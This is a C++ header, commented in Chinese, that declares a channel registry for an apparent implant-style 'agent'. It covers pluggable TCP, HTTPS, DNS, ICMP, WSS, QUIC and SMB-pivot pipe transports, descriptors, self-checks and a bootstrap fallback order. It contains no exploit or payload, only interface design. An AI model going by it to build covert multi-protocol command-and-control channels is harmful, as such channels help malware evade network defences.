/**
 * @file ChannelRegistry.hpp
 * @brief 通道注册表: "加一个通道"的唯一注册点
 * @details
 * **加一个通道的收敛目标**(P1,  讨论落地):
 *   实现 `IChannel` + 在 `RegisterBuiltinChannels` 填一个 `ChannelDescriptor`。
 *   装配层 / 配置层 / 会话层不再各自维护一份"通道类型 if-else"。
 *
 * **为什么要有 ChannelDescriptor**: 此前"通道类型"这一个概念被拆成 4 份互不校验
 * 的真相 —— (1) 字符串字面量(散在 Internals.h 与 AgentConfig.cpp 的 7 处 if)、
 * (2) `TransportType` 枚举、(3) `ChannelSpec` 扁平字段集、(4) 启动顺序表。
 * 加通道要在 4 份真相上各改一遍, 漏一处**不报错、静默失效**(典型: 漏
 * `ChannelOrderForMode` → 通道注册成功但启动永不选中)。本结构把 (1)(3)(4) 及
 * 能力表 (2 的映射) 一次性收进"注册项", 让"注册一行"真正等于"加一个通道"。
 *
 * **依赖注入()**: builder 需要一个"平台依赖包", 生产路径填入真工厂,
 * 夹具填入假 ops —— 这正是 实测出的约束: 四传输的构造函数可注入,
 * 但 HTTPS/ICMP 的**工厂**不接受 ops, 故依赖包设计为可替换的工厂函数。
 *
 * **依赖方向**: 本头只依赖 `IChannel` / `ChannelConfig`(TransportConfig), 不依赖
 * `AgentConfig` —— 描述符的配置构造器以 `TransportConfig` 为唯一中间表示, 由调用方
 * (装配层, 它本就持有 AgentConfig) 完成 ChannelSpec / 扁平字段 → 字段提取。
 */
#pragma once

#include <cstdint>
#include <functional>
#include <map>
#include <memory>
#include <string>
#include <vector>

#include "Core/Comms/Channel/ChannelCaps.hpp"
#include "Core/Comms/Channel/ChannelConfig.hpp"
#include "Core/Comms/Channel/IChannel.hpp"
#include "Core/Comms/Platform/INetworkOps.hpp"
#include "Core/Comms/Platform/IPipeOps.hpp"
#include "Core/Comms/Platform/IHttpOps.hpp"
#include "Core/Comms/Transports/Icmp/IcmpOps.hpp"
#include "Core/Comms/Transports/Quic/IQuicOps.hpp"

namespace cleat {

    /**
     * @brief 通道构建依赖(生产填真工厂, 夹具填假 ops)
     * @details 生命周期: 由调用方(装配层/夹具)持有并被引用, 需活过 Create 调用;
     *          返回的 `unique_ptr` 由 builder 交给通道。
     */
    struct ChannelDeps {
        INetworkOps* net_ops = nullptr;                     ///< TCP/DNS/WSS 需要
        std::function<std::unique_ptr<IHttpOps>()> make_http;  ///< HTTPS; 空 = 该平台不支持
        std::function<std::unique_ptr<IIcmpOps>()> make_icmp;  ///< ICMP; 空 = 该平台不支持
        std::function<std::unique_ptr<IPipeOps>()> make_pipe;  ///< 管道(SMB pivot L1); 空 = 该平台不支持
        std::function<std::unique_ptr<IQuicOps>()> make_quic;  ///< QUIC(msquic); 空 = 该平台不支持
    };

    /// 构建器: (通道规格, 依赖包) → 通道实例; 失败返回 nullptr
    using ChannelBuilder =
        std::function<std::unique_ptr<IChannel>(const TransportConfig&, ChannelDeps&)>;

    /**
     * @brief 配置构造输入(来源无关的扁平字段)
     * @details 描述符的配置构造器只认它 —— 装配层负责把
     *          `AgentConfig`(启动扁平字段) 或 `ChannelSpec`(热切换下发) 都归一到这里。
     *          这样"一个通道如何从配置变成 TransportConfig"只有一份实现。
     */
    struct ChannelConfigInput {
        std::string host;
        uint16_t    port = 0;
        std::string url;            ///< https/wss: 通用 url 槽(https 用)
        std::string wss_url;        ///< wss 专属 url 槽(P2: 与 https 分裂的既成事实, 由 wss 描述符自行取用)
        std::string upload_url;     ///< https
        std::string dns_server;     ///< dns
        std::string dns_domain;     ///< dns
        std::string icmp_target;    ///< icmp
        std::string pipe_key;       ///< pipe
        uint32_t    timeout_ms = 5000;
    };

    /**
     * @brief 通道描述符: 一个通道的全部"注册时可知"信息
     * @details 这是收敛的核心 —— 把原先散落在 4 处的翻译收进一处。
     */
    struct ChannelDescriptor {
        /// = 旧 ChannelRegistry::Create 的构建器
        ChannelBuilder build;

        /// = 旧 CapsForType 的能力表(类型 → 能力), 从枚举 switch 收进注册项
        std::function<ChannelCaps()> caps;

        /// = 旧 BuildBootstrapChannelConfig / BuildChannelConfigFromSpec 的合并体
        /// 返回 false = 该通道未被配置(跳过); why 说明原因
        std::function<bool(const ChannelConfigInput&, TransportConfig&, std::string& why)> from_config;

        /// = 旧 ChannelOrderForMode 的成员资格: 是否可由 transport_mode 启动选中
        bool bootstrap_capable = false;

        /// 启动链内的相对优先级(越小越靠前); 仅 bootstrap_capable 时有意义
        int  bootstrap_rank = 0;

        /// = 旧 ChannelSpec::Valid 的等价物: 该输入是否足以物化此通道
        std::function<bool(const ChannelConfigInput&)> valid;

        /// 是否依赖平台工厂(供自检报告"该平台是否支持")
        bool needs_dep = false;

        /// 人读备注(日志/自检输出用)
        std::string note;
    };

    class ChannelRegistry {
    public:
        /// 单例(装配层用); 夹具可自建实例(避免全局态)
        static ChannelRegistry& Instance();

        ChannelRegistry() = default;
        ChannelRegistry(const ChannelRegistry&) = delete;
        ChannelRegistry& operator=(const ChannelRegistry&) = delete;

        /**
         * @brief 注册/覆盖一个通道(完整描述符形式, P1 推荐)
         * @details 这是"加通道只改一处"的落地点。
         */
        void Register(const std::string& type, ChannelDescriptor descriptor);

        /**
         * @brief 兼容旧式: 只给构建器(能力/构造器留空)
         * @details 过渡期保留 —— 未迁移的调用点仍可用; 但 SelfCheck 会把
         *          "缺 caps/from_config" 的注册项报为不一致, 促使迁移。
         */
        void Register(const std::string& type, ChannelBuilder builder);

        /// 是否已注册
        bool Has(const std::string& type) const;

        /// 已注册类型(按注册顺序; 供装配日志与测试断言)
        std::vector<std::string> Types() const;

        /// 取描述符(供装配层读 bootstrap 资格/顺序/构造器); 未注册返回 nullptr
        const ChannelDescriptor* Descriptor(const std::string& type) const;

        /**
         * @brief 按类型构建通道
         * @return 成功返回通道; 类型未知或 builder 失败返回 nullptr
         */
        std::unique_ptr<IChannel> Create(const std::string& type,
            const TransportConfig& cfg, ChannelDeps& deps) const;

        /**
         * @brief 由 transport_mode 产出启动候选顺序(P1: 取代 ChannelOrderForMode)
         * @details 遍历已注册且 bootstrap_capable 的描述符, 按 (rank, 注册序) 排序。
         *          **所有可启动通道一视同仁**: 不给任何通道做
         *          "mode 命中即独占"的特判。mode 的语义 = **首选通道**: 命中者提到最前,
         *          其余仍保留为降级候选。
         * @param mode 启动传输模式(如 "https"/"dns"/"icmp"/"wss"/"tcp"); 空或不命中 = 纯按 rank
         */
        std::vector<std::string> BootstrapOrder(const std::string& mode) const;

        /**
         * @brief 启动自检(P0): 报告"注册了但不可用"的通道
         * @details 检查三类不一致并返回人读报告(为空 = 全一致):
         *          (a) 缺 caps / from_config(旧式注册未迁移);
         *          (b) bootstrap_capable=false 且非已知豁免(如 pipe);
         *          (c) needs_dep=true 但未在 deps 提供工厂(该平台不支持)。
         * @param deps 当前装配依赖包(用于检查 (c)); 可为 nullptr 跳过该项
         */
        std::vector<std::string> SelfCheck(const ChannelDeps* deps) const;

        /// 供日志: 每个通道的 {type, caps.bandwidth, bootstrap_capable, rank}
        std::vector<std::string> DumpDescriptors() const;

    private:
        std::map<std::string, ChannelDescriptor> descriptors_;
        std::vector<std::string> order_;
    };

    /// 注册内建通道(tcp/https/dns/icmp/pipe/wss); 幂等, 可重复调用
    void RegisterBuiltinChannels(ChannelRegistry& registry);

    /**
     * @brief 按通道类型(字符串)给出能力声明 —— 能力表的**单一数据源**(P2.5)
     * @details 收敛前能力表挂在 `TransportType` 枚举的 `CapsForType` switch 上, 于是
     *          "加通道"必改枚举。P2.5 起以**字符串键**为准: 描述符的 `caps` 直接调它,
     *          `CapsForType(TransportType)` 退化为"枚举→字符串→本函数"的兼容薄层。
     *          新通道只在 `ChannelRegistry.cpp` 的 `RegisterBuiltinChannels` 声明能力,
     *          **无需**再动 `TransportType` 枚举。
     * @param type 通道类型名(如 "tcp"/"https"/"dns"/"icmp"/"pipe"/"wss")
     * @return 该类型能力; 未知类型返回默认(Stream/Push/High)并由 SelfCheck 兜底报出
     */
    ChannelCaps CapsForTypeStr(const std::string& type);

} // namespace cleat
